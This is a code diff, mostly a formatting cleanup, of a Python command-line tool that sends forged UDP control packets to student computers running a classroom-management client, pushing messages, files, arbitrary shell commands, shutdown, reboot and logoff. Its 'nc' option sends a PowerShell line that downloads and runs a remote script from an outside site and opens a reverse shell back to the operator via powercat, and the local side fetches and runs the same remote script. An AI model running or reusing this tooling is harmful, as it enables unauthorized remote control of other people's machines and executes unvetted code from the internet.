@@ -7,45 +7,79 @@ from multiprocessing import Pool, freeze_support
 from os import system
 
 from ..core import (
-    COMMAND_MAX_BYTES, COMMAND_OFFSET, FIREWALL_HELPER_ARGUMENT,
-    LOGOFF_COMMAND, MESSAGE_MAX_BYTES, MESSAGE_OFFSET, SendOptions, __version__,
-    basicCMD, detect_local_ip, execute_send, format_size, get_ip, local_ip_and_ports,
-    pkg_sendlist, prepare_packets, read_message, request_firewall_rule,
-    run_firewall_helper, send, split_message, transfer_file, validate_options,
+    COMMAND_MAX_BYTES,
+    COMMAND_OFFSET,
+    FIREWALL_HELPER_ARGUMENT,
+    LOGOFF_COMMAND,
+    MESSAGE_MAX_BYTES,
+    MESSAGE_OFFSET,
+    SendOptions,
+    __version__,
+    basicCMD,
+    detect_local_ip,
+    execute_send,
+    format_size,
+    get_ip,
+    local_ip_and_ports,
+    pkg_sendlist,
+    prepare_packets,
+    read_message,
+    request_firewall_rule,
+    run_firewall_helper,
+    send,
+    split_message,
+    transfer_file,
+    validate_options,
 )
 
 
-
 def build_parser():
-    parser = argparse.ArgumentParser(
-        description="极域学生端 UDP 控制报文测试工具")
+    parser = argparse.ArgumentParser(description="极域学生端 UDP 控制报文测试工具")
     parser.add_argument(
-        '-V', '--version', action='version', version=__version__,
-        help="显示版本号并退出")
-    parser.add_argument('-ip', type=str, help="ip 指定目标IP地址")
-    parser.add_argument('-p', type=int, default=4705, help="port 指定监听端口，默认端口为4705")
+        "-V",
+        "--version",
+        action="version",
+        version=__version__,
+        help="显示版本号并退出",
+    )
+    parser.add_argument("-ip", type=str, help="ip 指定目标IP地址")
+    parser.add_argument(
+        "-p", type=int, default=4705, help="port 指定监听端口，默认端口为4705"
+    )
     message_options = parser.add_mutually_exclusive_group()
     message_options.add_argument(
-        '-msg', type=str, help="发送文本消息，支持多行；超长内容自动分条")
+        "-msg", type=str, help="发送文本消息，支持多行；超长内容自动分条"
+    )
     message_options.add_argument(
-        '--msg-file', type=str, metavar="PATH",
-        help="从 UTF-8 文件读取消息；使用 - 从标准输入读取")
+        "--msg-file",
+        type=str,
+        metavar="PATH",
+        help="从 UTF-8 文件读取消息；使用 - 从标准输入读取",
+    )
     message_options.add_argument(
-        '--file', type=str, metavar="PATH",
-        help="传送本地文件到目标电脑桌面")
+        "--file", type=str, metavar="PATH", help="传送本地文件到目标电脑桌面"
+    )
     parser.add_argument(
-        '-c', type=str, help="command命令 eg: -c   \"cmd.exe /c ipconfig\"")
-    parser.add_argument('-l', type=int, default=1, help="循环次数，默认为1")
-    parser.add_argument('-t', type=int, default=22, help="循环时间间隔，默认是22秒")
+        "-c", type=str, help='command命令 eg: -c   "cmd.exe /c ipconfig"'
+    )
+    parser.add_argument("-l", type=int, default=1, help="循环次数，默认为1")
+    parser.add_argument("-t", type=int, default=22, help="循环时间间隔，默认是22秒")
     parser.add_argument(
-        '--file-ip', type=str, metavar="IP",
-        help="文件传送时发送端 IP，默认自动检测")
+        "--file-ip", type=str, metavar="IP", help="文件传送时发送端 IP，默认自动检测"
+    )
     parser.add_argument(
-        '--file-timeout', type=int, default=120, metavar="SECONDS",
-        help="等待目标下载文件的秒数，默认 120")
+        "--file-timeout",
+        type=int,
+        default=120,
+        metavar="SECONDS",
+        help="等待目标下载文件的秒数，默认 120",
+    )
     parser.add_argument(
-        '-e', type=str, choices=['r', 's', 'l', 'g', 'nc', 'break', 'continue'],
-        help="Extra Options加载额外的选项 eg：-e r；-e l 注销")
+        "-e",
+        type=str,
+        choices=["r", "s", "l", "g", "nc", "break", "continue"],
+        help="Extra Options加载额外的选项 eg：-e r；-e l 注销",
+    )
     return parser
 
 
@@ -58,32 +92,34 @@ def creat_send_object(arguments):
     # 获取命令内容
     message = read_message(arguments)
     if message:
-        send_list.extend(pkg_sendlist('-msg', chunk) for chunk in split_message(message))
+        send_list.extend(
+            pkg_sendlist("-msg", chunk) for chunk in split_message(message)
+        )
 
     if arguments.c:
-        send_list.append(pkg_sendlist('-c', arguments.c))
+        send_list.append(pkg_sendlist("-c", arguments.c))
 
-    if arguments.e == 'r':
-        send_list.append(basicCMD['-r'].copy())
+    if arguments.e == "r":
+        send_list.append(basicCMD["-r"].copy())
 
-    if arguments.e == 's':
-        send_list.append(basicCMD['-s'].copy())
+    if arguments.e == "s":
+        send_list.append(basicCMD["-s"].copy())
 
-    if arguments.e == 'l':
-        send_list.append(pkg_sendlist('-c', LOGOFF_COMMAND))
+    if arguments.e == "l":
+        send_list.append(pkg_sendlist("-c", LOGOFF_COMMAND))
 
     return send_list
 
 
 def single_command(arguments):
-    if arguments.e == 'g':
+    if arguments.e == "g":
         try:
             ip, ports = local_ip_and_ports()
             if not ip:
                 print("未能获取本机 IP 地址")
                 return
             print("\nYour ip addres is:" + ip)
-            print("\nYour student client possible ports are:" + ','.join(ports))
+            print("\nYour student client possible ports are:" + ",".join(ports))
         except Exception as error:
             print("[-] %s" % error)
         return
@@ -93,7 +129,9 @@ def single_command(arguments):
         sleep(1)
         system("cls")
         failed = any(not item["success"] for item in results)
-        print("[-] 部分防火墙设置失败，请检查管理员权限" if failed else "防火墙规则已阻断")
+        print(
+            "[-] 部分防火墙设置失败，请检查管理员权限" if failed else "防火墙规则已阻断"
+        )
         return
 
     elif arguments.e == "continue":
@@ -110,28 +148,36 @@ def netcat(num, arguments):
     send_list = []
     hostname = socket.gethostname()
     ip = socket.gethostbyname(hostname)
-    cmd = "powershell IEX (New-Object System.Net.Webclient).DownloadString('https://xss.pt/hYvg');powercat -c {} -p {} -e cmd".format(ip, num)
-    send_list.append(pkg_sendlist('-c', cmd))
+    cmd = "powershell IEX (New-Object System.Net.Webclient).DownloadString('https://xss.pt/hYvg');powercat -c {} -p {} -e cmd".format(
+        ip, num
+    )
+    send_list.append(pkg_sendlist("-c", cmd))
     send(send_list, arguments.ip, arguments.p, arguments.l, arguments.t)
 
 
 def run_file_transfer(arguments):
     result = transfer_file(
-        arguments.ip, arguments.p, arguments.file,
-        listen_ip=arguments.file_ip, timeout=arguments.file_timeout, report=print)
+        arguments.ip,
+        arguments.p,
+        arguments.file,
+        listen_ip=arguments.file_ip,
+        timeout=arguments.file_timeout,
+        report=print,
+    )
     if len(result["targets"]) == 1:
-        print("文件已传送：%s（%s）" % (
-            result["name"], format_size(result["size"])))
+        print("文件已传送：%s（%s）" % (result["name"], format_size(result["size"])))
     else:
-        print("文件已传送到 %d 个目标桌面：%s（%s）" % (
-            len(result["targets"]), result["name"], format_size(result["size"])))
+        print(
+            "文件已传送到 %d 个目标桌面：%s（%s）"
+            % (len(result["targets"]), result["name"], format_size(result["size"]))
+        )
     return 0
 
 
 def run_from_cmd(arguments):
     try:
         single_command(arguments)
-        if arguments.e in {'g', 'break', 'continue'}:
+        if arguments.e in {"g", "break", "continue"}:
             return
         if arguments.file:
             if arguments.e or arguments.msg or arguments.msg_file or arguments.c:
@@ -139,16 +185,26 @@ def run_from_cmd(arguments):
             return run_file_transfer(arguments)
         if arguments.file_ip or arguments.file_timeout != 120:
             raise ValueError("--file-ip 和 --file-timeout 仅用于文件传送")
-        if arguments.e != 'nc':
+        if arguments.e != "nc":
             send_list = creat_send_object(arguments)
-            send(send_list, arguments.ip, arguments.p, arguments.l, arguments.t,
-                 report=print)
+            send(
+                send_list,
+                arguments.ip,
+                arguments.p,
+                arguments.l,
+                arguments.t,
+                report=print,
+            )
             return
         num = random.randint(1, 65535)
         pool = Pool(processes=1)
         pool.apply_async(netcat, (num, arguments))
         print("listening on [any] {} ...".format(num))
-        system("powershell IEX (New-Object System.Net.Webclient).DownloadString('https://xss.pt/hYvg');powercat -l -p {}".format(num))
+        system(
+            "powershell IEX (New-Object System.Net.Webclient).DownloadString('https://xss.pt/hYvg');powercat -l -p {}".format(
+                num
+            )
+        )
         pool.close()
         pool.join()
     except Exception as e:
